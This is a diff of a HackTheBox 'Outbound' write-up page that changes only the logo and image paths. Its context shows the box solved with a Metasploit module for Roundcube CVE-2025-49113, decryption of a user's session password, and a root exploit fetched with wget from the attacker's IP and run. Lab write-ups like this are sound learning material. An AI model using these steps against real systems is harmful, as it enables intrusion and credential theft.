@@ -84,9 +84,9 @@
   <header class="header">
   <div class="header__inner">
     <div class="header__logo">
-      <a href="https://Maaroof-Khan10.github.io/">
+      <a href="/">
   <div class="logo">
-    re-Terminal
+    MK-WriteUps
   </div>
 </a>
 
@@ -130,7 +130,7 @@
   <div class="post-content"><div>
         <p>Hello everyone, and welcome to my first-ever write-up!</p>
 <p>This box seemed pretty straightforward at first, but it wasn&rsquo;t long before it had me begging for mercy. Let&rsquo;s dive in!</p>
-<p><img src="htb_task_page.png" alt="HackTheBox Task Page"></p>
+<p><img src="/posts/2/htb_task_page.png" alt="HackTheBox Task Page"></p>
 <p>I booted up the &ldquo;Outbound&rdquo; machine, ready to see what this bad boy had to offer. We&rsquo;re handed credentials right from the start (<code>tyler / LhKL1o9Nm3X2</code>), which almost certainly means a login portal awaits.</p>
 <h3 id="initial-reconnaissance">Initial Reconnaissance<a href="#initial-reconnaissance" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>As is tradition with any HackTheBox machine, the first step is always <code>nmap</code>.</p>
@@ -167,16 +167,16 @@
 </span></span></code></pre></div><p>I added the following line:
 <code>10.10.11.77     outbound.htb mail.outbound.htb</code></p>
 <p>Time to check out this mailing service.</p>
-<p><img src="roundcube_login.png" alt="Roundcube Login Page"></p>
+<p><img src="/posts/2/roundcube_login.png" alt="Roundcube Login Page"></p>
 <h3 id="roundcube-exploit">Roundcube Exploit<a href="#roundcube-exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>Here it is, the moment we&rsquo;ve all been waiting for: a login page! Let&rsquo;s use the credentials we were given. Success! We&rsquo;re in, but Tyler&rsquo;s inbox is bone dry. Guess he isn&rsquo;t too popular.</p>
 <p>A quick look at the &ldquo;About&rdquo; section reveals the software version.</p>
-<p><img src="roundcube_about.png" alt="Roundcube About Page"></p>
+<p><img src="/posts/2/roundcube_about.png" alt="Roundcube About Page"></p>
 <p>We&rsquo;re dealing with <strong>Roundcube Webmail 1.6.10</strong>. Before diving down a Google rabbit hole for exploits, my first move is always to fire up <code>metasploit</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfconsole
 </span></span><span style="display:flex;"><span>search roundcube
 </span></span></code></pre></div><p>And what do you know, we hit the jackpot! An exploit for our version is available. The exact CVE is <code>CVE‑2025‑49113</code>.</p>
-<p><img src="metasploit_exp.png" alt="Metasploit Modules"></p>
+<p><img src="/posts/2/metasploit_exp.png" alt="Metasploit Modules"></p>
 <p>Time to exploit (rubs hands).
 Used the following steps to run the exploit:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use <span style="color:#ae81ff">1</span>
@@ -204,7 +204,7 @@ Here is a sneak peak:</p>
 </span></span></code></pre></div><h4 id="this-part-in-my-opinion-was-the-trickiest-of-all-in-this-box">This part in my opinion was the trickiest of all in this box<a href="#this-part-in-my-opinion-was-the-trickiest-of-all-in-this-box" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
 <p>The <code>session</code> table gives us a bunch of base64 encoded session details</p>
 <p>Using CyberChef, we can decode this data and find something very interesting.</p>
-<p><img src="cyberchef-jacob.png" alt="CyberChef showing Jacob&rsquo;s credentials"></p>
+<p><img src="/posts/2/cyberchef-jacob.png" alt="CyberChef showing Jacob’s credentials"></p>
 <p>We found another user, <code>jacob</code>, and more importantly, his password! The catch? It&rsquo;s encrypted. But wait, we have that DES key from the config file. After a lot of digging, I confirmed that Roundcube uses Triple DES for session data encryption.</p>
 <p>Here&rsquo;s how to decrypt the password:</p>
 <ol>
@@ -215,7 +215,7 @@ Here is a sneak peak:</p>
 <li>Get the password</li>
 </ol>
 <p>Here is the decrypted password we get:</p>
-<p><img src="password_decrypt.png" alt="CyberChef decrypting the password"></p>
+<p><img src="/posts/2/password_decrypt.png" alt="CyberChef decrypting the password"></p>
 <h3 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>Now that we have jacob in our control, let&rsquo;s check this lad&rsquo;s account shall we</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su jacob
@@ -257,7 +257,7 @@ Lets use <code>LinPeas</code> to find something (<code>sudo -l</code> could also
 </span></span><span style="display:flex;"><span>wget http://&lt;Your-HTB-IP&gt;/exploit.py
 </span></span><span style="display:flex;"><span>python3 exploit.py
 </span></span></code></pre></div><p>And Wham-Bam-Thank-You-Ma&rsquo;am! We got root!</p>
-<p><img src="cover.png" alt="HTB PWNED"></p>
+<p><img src="/posts/2/cover.png" alt="HTB PWNED"></p>
 <p>Now, just head to <code>/root</code> and grab your well-earned flag.</p>
 <p>Happy Hacking! And see you next week</p>
 
